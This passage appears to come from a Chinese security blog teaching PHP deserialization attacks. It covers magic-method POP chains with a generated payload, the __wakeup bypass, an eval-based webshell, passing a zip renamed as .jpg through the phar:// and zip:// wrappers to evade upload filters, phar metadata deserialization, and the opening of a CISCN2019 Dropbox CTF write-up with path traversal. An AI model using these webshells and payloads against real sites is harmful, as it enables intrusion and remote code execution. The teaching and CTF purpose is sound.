variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">normal</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">evil</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>crack.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">evil</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">lemon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><p><img src="1.png" alt=""><br>protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。</p><h2 id="三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数"><a href="#三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数" class="headerlink" title="三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数"></a>三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数</h2><h3 id="先解释几个魔法函数"><a href="#先解释几个魔法函数" class="headerlink" title="先解释几个魔法函数"></a>先解释几个魔法函数</h3><pre><code>__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><p>更多参考<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><h4 id="1-call"><a href="#1-call" class="headerlink" title="1. __call()"></a>1. __call()</h4><p>PHP5 的对象新增了一个专用方法 <strong>call()，这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在或被权限控制中的方法，</strong>call 方法将会被自动调用。<br>demo</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span>    <span class="token punctuation">{</span>         <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"a"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$arguments</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"调用不存在的方法名是:"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'&lt;br>参数是:'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token variable">$ins</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>         <span class="token variable">$ins</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//输出结果为 调用不存在的方法名是：b 参数是：Array ( [0] => Array ( [0] => 1 [1] => 2 [2] => 3 ) ) </span></code></pre><h4 id="2-invoke"><a href="#2-invoke" class="headerlink" title="2. __invoke()"></a>2. __invoke()</h4><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。本特性只在 PHP 5.3.0 及以上版本有效</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">CallableClass</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CallableClass</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出</p><pre><code>int(5)bool(true)</code></pre><h4 id="3-toString"><a href="#3-toString" class="headerlink" title="3.__toString"></a>3.__toString</h4><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// Declare a simple class</span><span class="token keyword">class</span> <span class="token class-name">TestClass</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$foo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span> <span class="token operator">=</span> <span class="token variable">$foo</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestClass</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$class</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//输出 Hello</span></code></pre><p>需要指出的是在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 echo 或 print 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 printf()，使用 %s 修饰符），但不能用于非字符串环境（如使用 %d 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 E_RECOVERABLE_ERROR 级别的错误。</p><h4 id="4-wakeup"><a href="#4-wakeup" class="headerlink" title="4.__wakeup()"></a>4.__wakeup()</h4><p><strong>wakeup()是在反序列化操作中起作用的魔法函数，当unserialize的时候，会检查时候存在</strong>wakeup()函数，如果存在的话，会优先调用__wakeup()函数。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">xctf</span><span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"this is __wakeup()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">xctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//输出this is __wakeup()</span></code></pre><p>ps: <strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么i就调用</strong>wakeup()函数，如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">xctf</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad requests'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这里差个反括号，但是源码确实是这样的。</span><span class="token operator">?</span>code<span class="token operator">=</span></code></pre><p>将上面的要求序列化后为<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，xctf后有一个数字1，这个1是代表这个类有一个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。<br>如，我们提交<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，将其改为2，得到flag。</p><h4 id="5-construct-destruct"><a href="#5-construct-destruct" class="headerlink" title="5.construct(),destruct()"></a>5.<strong>construct(),</strong>destruct()</h4><p>同c++的构造函数和析构函数</p><h4 id="6-clone"><a href="#6-clone" class="headerlink" title="6.__clone()"></a>6.__clone()</h4><p>克隆对象时被调用。如：<code>$t=new Test()，$t1=clone $t;</code></p><h4 id="7-sleep"><a href="#7-sleep" class="headerlink" title="7.__sleep()"></a>7.__sleep()</h4><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p><h3 id="那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言"><a href="#那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言" class="headerlink" title="那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言~"></a>那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言~</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">start_gg</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Call</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CallFunc</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$test2</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$s1</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token punctuation">;</span>                <span class="token variable">$s1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">InvokeFunc</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod2</span> <span class="token operator">=</span> <span class="token string">"字符串拼接"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">ToStringFunc</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$str1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$str2</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">GetFlag</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"flag:"</span><span class="token punctuation">.</span><span class="token string">"flag{test}"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'string'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>我们一步一步来处理</p><ol><li>首先要利用class GetFlag中的get_flag,所以我们只要有一个<code>1-ToStringFunc类的实例当字符串来使用</code></li><li>InvokeFunc中使用了字符串拼接可以利用，所以我们只要有一个<code>2-InvokeFunc类的实例，并且str1要是1-ToStringFunc，并且这个类要当函数使用</code></li><li>CallFunc中刚好有一个 $s1();函数调用，所以我们只要有一个<code>3-CallFunc类的实例，并且mod1要是2-InvokeFunc，并且要调用一次不存在的函数</code></li><li>Call中刚好有一个test2函数调用，并且不存在，所以我们只要一个<code>4-Call的类的实例，并且mod1要是3-CallFunc</code></li><li>最后需要一个自动函数调用的方法，刚好start_gg有一个析构函数，所以我们只要一个<code>5-startgg类的实例，并且mod1要是4-call</code></li></ol><p>完美~这就是艺术<br>ps:<code>protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。</code><br>在序列化之前只调用__construct函数，并且序列化将对象转换成字符串，仅保留对象里的成员变量，不保留函数方法。<br>所以构造的时候只要记录我们需要的属性+构造函数即可</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">GetFlag</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"flag:"</span><span class="token punctuation">.</span><span class="token string">"flag{Test}"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">ToStringFunc</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$str1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">InvokeFunc</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CallFunc</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokeFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Call</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CallFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">start_gg</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">start_gg</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//构造start_gg类对象$b</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出<br><code>O%3A8%3A%22start_gg%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A4%3A%22Call%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A8%3A%22CallFunc%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A10%3A%22InvokeFunc%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A12%3A%22ToStringFunc%22%3A1%3A%7Bs%3A4%3A%22str1%22%3BO%3A7%3A%22GetFlag%22%3A0%3A%7B%7D%7D%7D%7D%7D%7D</code><br><img src="2.png" alt=""><br>秒啊</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar的利用姿势</title>
      <link href="/2020/01/04/phar-de-li-yong-zi-shi/"/>
      <url>/2020/01/04/phar-de-li-yong-zi-shi/</url>
      
        <content type="html"><![CDATA[<p>主要来说就2大利用，一个上传用phar伪协议绕过，一个是Phar反序列化漏洞</p><h3 id="Phar的简述"><a href="#Phar的简述" class="headerlink" title="Phar的简述"></a>Phar的简述</h3><p>phar是什么?Phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上</p><h3 id="利用姿势一、上传绕过"><a href="#利用姿势一、上传绕过" class="headerlink" title="利用姿势一、上传绕过"></a>利用姿势一、上传绕过</h3><p>使用Phar://伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包）</p><h5 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h5><p>test.php</p><pre><code>&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</code></pre><p>然后将test.php压缩-&gt;test.zip改名-&gt;test.jpg<br>index.php</p><pre><code>&lt;?php include(&#39;phar://./test.jpg/test.php&#39;);?&gt;</code></pre><p>成功包含（test.jpg为压缩包文件，后面的test.php为里面压缩包文件）<br>其实和zip协议感觉上差不多</p><h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><p>利用zip或phar伪协议可以读取压缩包中的文件，解压的压缩包与后缀无关。<br>如将file.txt压缩成zip，改后缀为jpg绕过上传限制然后利用如下读取文件</p><pre><code>/about.php?file=phar://./images/file.jpg/1.php/about.php?file=zip://./images/file.jpg%231.php</code></pre><h3 id="利用姿势二：Phar反序列化漏洞"><a href="#利用姿势二：Phar反序列化漏洞" class="headerlink" title="利用姿势二：Phar反序列化漏洞"></a>利用姿势二：Phar反序列化漏洞</h3><p>test:<br>PS：php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。<br><img src="1.png" alt=""></p><pre><code>[Phar]; http://php.net/phar.readonlyphar.readonly = Off</code></pre><p>先新建一个php内容为</p><pre><code>&lt;?php    class Test{        public $test=&quot;test&quot;;    }    @unlink(&quot;test.phar&quot;);    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub    $o = new Test();    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    $phar-&gt;stopBuffering();    //签名自动计算?&gt;</code></pre><p>访问后得到文件test.phar<br><img src="2.png" alt=""><br>然后使用<code>Phar://</code>协议<br>demo.php</p><pre><code>&lt;?phpclass Test{    function __destruct(){        echo $this-&gt;test;    }}file_get_contents(&quot;phar://./test.phar/test.txt&quot;);?&gt;//输出test</code></pre><p>这里的test.txt可以是任意字符<br>除了file_get_contents，这些函数都可用<br><img src="3.png" alt=""></p><h3 id="phar反序列化漏洞原理分析"><a href="#phar反序列化漏洞原理分析" class="headerlink" title="phar反序列化漏洞原理分析"></a>phar反序列化漏洞原理分析</h3><h4 id="phar文件结构-参考上面test-phar的图"><a href="#phar文件结构-参考上面test-phar的图" class="headerlink" title="phar文件结构(参考上面test.phar的图)"></a>phar文件结构(参考上面test.phar的图)</h4><p>、stub</p><p>一个供phar扩展用于识别的标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p>2、manifest</p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。<br><img src="4.png" alt=""><br>3、contents</p><p>被压缩文件的内容。</p><p>4、signature</p><p>签名，放在文件末尾，格式如下：</p><h4 id="发生反序列化原因"><a href="#发生反序列化原因" class="headerlink" title="发生反序列化原因"></a>发生反序列化原因</h4><p>在使用phar://协议读取文件时，文件会被解析成phar<br>解析过程中会触发php_var_unserialize()函数对meta-data的操作，造成反序列化。<br>一般情况下，利用Phar反序列漏洞有几个条件：</p><pre><code>可以上传Phar文件有可以利用的魔术方法文件操作函数的参数可控</code></pre><h3 id="CISCN2019-Dropbox"><a href="#CISCN2019-Dropbox" class="headerlink" title="CISCN2019-Dropbox"></a>CISCN2019-Dropbox</h3><h4 id="phar和pop链的利用姿势（参考-CISCN2019-华北赛区-Day1-Web1-Dropbox）"><a href="#phar和pop链的利用姿势（参考-CISCN2019-华北赛区-Day1-Web1-Dropbox）" class="headerlink" title="phar和pop链的利用姿势（参考[CISCN2019 华北赛区 Day1 Web1]Dropbox）"></a>phar和pop链的利用姿势（参考[CISCN2019 华北赛区 Day1 Web1]Dropbox）</h4><p>地址：<a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox" target="_blank" rel="noopener">buuctf/dropbox</a><br>这题套路差不多，也是phar触发的反序列化，每次比赛都有这样的题。。。这题没啥说的，主要是细心。<br>随便注册个账号，直接登录进去，有三个功能：上传、下载、删除。肯定要试试任意下载，果然有一个。先试了passwd验证了之后想开始找目录，找了半天发现用../../index.php就行了。<br>下载源码分析几个主要的文件，分别是class.php、download.php和delete.php。<br>class.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token 